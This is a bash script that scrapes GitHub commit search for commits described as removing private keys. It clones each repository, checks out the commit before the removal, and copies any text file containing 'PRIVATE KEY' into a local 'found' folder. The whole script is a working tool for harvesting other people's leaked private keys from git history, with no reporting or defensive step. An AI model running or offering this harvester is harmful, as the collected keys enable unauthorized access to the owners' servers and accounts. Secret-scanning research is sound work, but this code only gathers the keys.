#!/bin/bash

# Search github, scrape for removed keys in commits
search_term="removed+private+key"

get_commits() {
    search=$(curl -s "https://github.com/search?q=$search_term&type=Commits")
    links=$(echo "$search" | grep "Browse the repository at this point in the history")
    repos=$(echo "$links" | sed 's/.*href="\(.*\)" aria.*/\1/p' | uniq)
    echo "[+] Found" $(echo "$repos" | wc -l) "Projects"
}

get_files() {
    for link in $repos; do
	name=$(echo $link | sed -ne 's:/\(.*\)/tree/.*:\1:p')
	commit=$(echo $link | sed -n 's:.*tree/\(.*\):\1:p')
	cd $dirr
	rm -fr tmp/curr	
	cd tmp
	echo "[*] Cloning $name..."
	git clone https://github.com/$name curr &>/dev/null
	# If this fail then skip all the next stuff
	if [ $? = 0 ]; then
	#echo "[*] Working on $name"	
	cd curr

	# Make sure the commit is still there
	git cat-file $commit~1 -t &>/dev/null
	retval=$?
	if [ $retval != 0 ]; then
	    echo "[!] Error commit doesnt exist $commit~1"
	    cd ../../
	    rm -fr tmp/curr
	    continue
	else
	    :
	    #echo "[+] Checked out $commit~1"
	fi
	
	# Get the files that have changed
	files=$(git diff "$commit~1" $commit --name-only )
	echo "$files"
	echo "[+]" $(echo "$files" | wc -l)" file(s) found"
        # Checkout the commit before the change
	git checkout $commit~1 &>/dev/null
	retval=$?
	if [ $retval != 0 ]; then
	    echo "[!] Error cannot checkout $commit~1"
	    continue
	else
	    :
	    #echo "[+] Checked out $commit~1"
	fi
	
	#grep -l 'PRIVATE KEY' -r ./
	for f in $files; do
	    # Make sure the file is ASCII
	    isascii="$(file $f | grep -e '(ASCII|TEXT'))"
	    if [ "$isascii" != "" ]; then 
		# Get the commit difference
		change=$(git show "$commit~1":$f)
		# Check if this contains a key
		if [ "$(echo $change | grep 'PRIVATE KEY')" != "" ]; then
		    echo -e "\t[+] $f has potential"
		    # Save the file that has potential
		    output_folder="$dirr/found/$(echo $name| cut -d'/' -f2)"
		    mkdir -p $output_folder
		    fil=$(echo $f | sed 's=.*/==' )
		    echo "$f - $fil"
		    git show "$commit~1":$f >> "$output_folder/$fil"
		fi
	    else
		echo "[!] Non-text $f $(file $f)"
	    fi
	done
	#echo $files
	#| sed -e '/BEGIN/,/END PRIVATE/!d')
	#key=$(echo $diff | sed 's:\n:\\n:p' |\
	#grep -o --color "BEGIN PRIVATE KEY.*END PRIVATE KEY")
	#echo $diff
	else
	    echo "[!] Error cloning $name"
	fi
	#echo [+] Done with $name
    done
    cd $dirr
    rm -fr tmp/curr	
}

init() {
    git config --global core.autocrlf false
    # Create the temp directory if it doesnt exist
    [ ! -d "tmp" ] && mkdir tmp
}
dirr=$PWD
init
get_commits
get_files
